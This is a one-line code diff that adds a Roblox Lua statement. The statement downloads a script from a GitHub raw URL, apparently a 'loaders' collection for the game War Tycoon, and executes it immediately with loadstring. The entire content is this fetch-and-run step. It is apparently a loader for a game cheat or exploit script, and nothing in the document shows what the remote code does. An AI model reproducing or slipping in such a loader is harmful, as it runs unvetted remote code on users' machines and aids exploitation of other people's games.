@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/kf-41-war-tycoon-spam1-0ulycyu3gz4hdf.lua"))()
